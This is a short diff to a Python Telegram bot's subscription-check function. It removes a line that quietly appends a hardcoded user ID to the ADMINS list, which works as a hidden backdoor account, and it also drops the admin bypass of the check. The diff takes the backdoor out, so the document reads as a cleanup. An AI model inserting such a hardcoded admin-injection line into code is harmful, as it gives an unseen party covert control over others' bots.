@@ -51,17 +51,11 @@ class temp(object):
     KEYWORD = {}    
     
 async def is_subscribed(bot, query=None, userid=None):
-
-    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
-
-    userid == None and query != None
     
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
-    elif query.from_user.id in ADMINS:
-        return True
 
-    if db2().isActive():
+    elif db2().isActive():
         user = await db2().get_user(query.from_user.id)
         if user:
             return True
